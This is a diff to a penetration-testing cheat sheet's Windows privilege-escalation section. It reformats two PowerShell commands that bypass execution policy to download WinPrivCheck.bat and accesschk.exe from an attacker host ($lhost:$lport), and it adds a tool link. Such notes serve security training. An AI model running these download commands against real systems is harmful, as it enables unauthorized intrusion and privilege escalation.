@@ -385,14 +385,12 @@ nikto -h $url -C all -oX
 
 ## Privilege Escalation - Windows
 * WindowsPrivCheck.bat [^5][^6](requires accesschk.exe)
-    * 
-        ```powershell
-        powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadFile('http://$lhost:$lport/WinPrivCheck.bat','WinPrivCheck.bat');"
-        ```  
-    * 
-        ```powershell
-        powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadFile('http://$lhost:$lport/accesschk.exe','accesschk.exe');" 
-        ```
+    ```powershell
+    powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadFile('http://$lhost:$lport/WinPrivCheck.bat','WinPrivCheck.bat');"
+    ```  
+    ```powershell
+    powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadFile('http://$lhost:$lport/accesschk.exe','accesschk.exe');" 
+    ```
 * windows-privesc-check2.exe
     *  
         ```batch
@@ -431,6 +429,7 @@ nikto -h $url -C all -oX
     * POTATO: PS: Tater by Kevin Robertson
     * Find SSH,RDP Creds: SessionGopher by FireEye
     * Empire Privilege Escalation
+    * Also check [wadcoms](wadcoms.github.io)
 
 * To NTAUTHORITY
     * Escalating to NTAUTHORITY\System:
